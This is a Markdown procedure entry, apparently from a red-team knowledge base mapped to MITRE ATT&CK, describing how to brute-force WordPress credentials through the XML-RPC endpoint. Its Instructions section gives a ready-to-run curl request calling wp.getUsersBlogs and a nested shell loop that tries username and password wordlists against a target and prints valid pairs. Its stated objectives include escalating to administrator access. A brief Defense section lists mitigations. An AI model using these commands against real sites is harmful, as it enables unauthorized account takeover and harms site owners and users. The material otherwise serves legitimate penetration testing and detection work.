---
id: proc-bruteforce-xmlrpc
tags:
  - wordpress
  - brute-force
  - xmlrpc
  - authentication
type: procedure
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-xmlrpc-bruteforce]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Brute Force]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:48.531Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[Password Spraying]]'
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Brute Force]]'
  - '[[Exploit Public-Facing Application]]'
---
# Brute-Force-WordPress-Logins-via-XML-RPC

## Summary

This procedure performs brute force attacks on WordPress login credentials using the XML-RPC interface exposed by xmlrpc.php, bypassing traditional login forms.

## Description

XML-RPC allows remote login attempts via methods like wp.getUsersBlogs, which can be abused for credential guessing without triggering web form protections. Targets PHP/WordPress environments. Prerequisites: accessible xmlrpc.php and wordlists; outcomes include successful credential discovery leading to account access.

## Requirements

1. Wordlists for usernames and passwords
2. Network access to xmlrpc.php
3. Scripting capability for automation

## Defense

Defensive measures and detection strategies:

- Disable XML-RPC or restrict to authenticated IPs
- Implement account lockouts and CAPTCHA on login attempts
- Log and alert on multiple failed wp.getUsersBlogs calls

## Objectives

1. Guess valid username/password combinations
2. Gain initial access to WordPress accounts
3. Escalate to administrative privileges if weak credentials found

## Instructions

### Step 1: Test Single Credential Pair

**Context**: Send a wp.getUsersBlogs call with test credentials to validate the method.

**Command** ([[commands/curl-xmlrpc-bruteforce]]):
```bash
curl -s -X POST http://target.com/xmlrpc.php -d "<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>password123</string></value></param></params></methodCall>"
```

> Successful login returns user blog details; failures include "faultCode": 403.

### Step 2: Automate Brute Force Loop

**Context**: Iterate over wordlists to test combinations systematically.

**Command** ([[commands/curl-xmlrpc-bruteforce-loop]]):
```bash
for user in $(cat users.txt); do for pass in $(cat passwords.txt); do curl -s -X POST http://target.com/xmlrpc.php -d "<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>$user</string></value></param><param><value><string>$pass</string></value></param></params></methodCall>" | grep -q 'faultCode'; if [ $? -ne 0 ]; then echo "Success: $user:$pass"; fi; done; done
```

> Grep for absence of faultCode to detect hits; adjust for rate limiting.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Brute Force]] Brute Force
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- [[Password Spraying]] Password Spraying

## Commands Used

- [[commands/curl-xmlrpc-bruteforce]]
- [[commands/curl-xmlrpc-bruteforce-loop]]

## Tools Used


## Tags

- [[brute-force]]
- [[xmlrpc]]
- [[wordpress]]
